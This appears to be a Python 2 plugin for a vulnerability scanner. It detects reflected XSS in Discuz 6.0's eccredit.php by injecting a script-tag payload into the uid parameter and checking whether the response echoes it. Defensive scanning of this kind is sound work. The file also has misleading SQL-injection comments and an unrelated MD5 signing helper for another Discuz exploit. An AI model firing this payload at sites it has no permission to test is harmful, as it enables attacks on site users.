# -*- coding: utf-8 -*-
'''
本插件针对 Discuz6 的 eccredit  中的 uid 未做严格过滤导致 xss 漏洞
author: lidq
created: 20161214
'''

import hashlib

# 导入SQL注入通用库，本插件是SQL注入基础插件，故写在通用库中
# 导入url请求公用库
from engine.engine_utils.InjectUrlLib import returnInjectResult
from engine.engine_utils.yd_http import request
from engine.engine_utils.common import *
# 导入日志处理句柄
from engine.logger import scanLogger as logger
# 导入默认的header头
from engine.engine_utils.DictData import headerDictDefault


def run_domain(http, config):
    # 重新组织请求的参数
    scanInfo = {}
    scanInfo['siteId'] = config['siteId']
    scanInfo['ip'] = config['ip']
    scanInfo['scheme'] = config['scheme']
    scanInfo['domain'] = config['domain']
    scanInfo['level'] = config['level']
    scanInfo['vulId'] = config['vulId']
    headers = headerDictDefault
    headers['cookie'] = config['cookie']
    headers['Host'] = config['domain']
    source_ip = config.get('source_ip')
    responseList = []
    try:
        # 使用单引号测试是否存在SQL报错，有则存在漏洞
        payload = "'"
        if source_ip:
            urlBase = scanInfo['scheme'] + "://" + source_ip
        else:
            urlBase = scanInfo['scheme'] + "://" + scanInfo['domain']

        url = urlBase + '/eccredit.php?action=list&uid="><script>alert(/hacking-xss_eccredit/);</script>'
        response = request(url=url, headers=headers, method="GET")
        if response['httpcode'] == 200:
            if response['response_body'].find("hacking-xss_eccredit") != -1:
                injectInfo = returnInjectResult(url=urlBase, confirm=1,
                                                detail="Discuz 6.0 的 eccredit  中的 uid 未做严格过滤导致 xss漏洞",
                                                response=response)
                responseList.append(getRecord2(scanInfo, injectInfo))
                return responseList

    except Exception, e:
        logger.exception(e)
    return responseList


def discuzx15_sign(exp_str):
    rawStr = "attach=tenpay&mch_vno=" + exp_str + "&retcode=0&key="
    return hashlib.md5(rawStr).hexdigest()
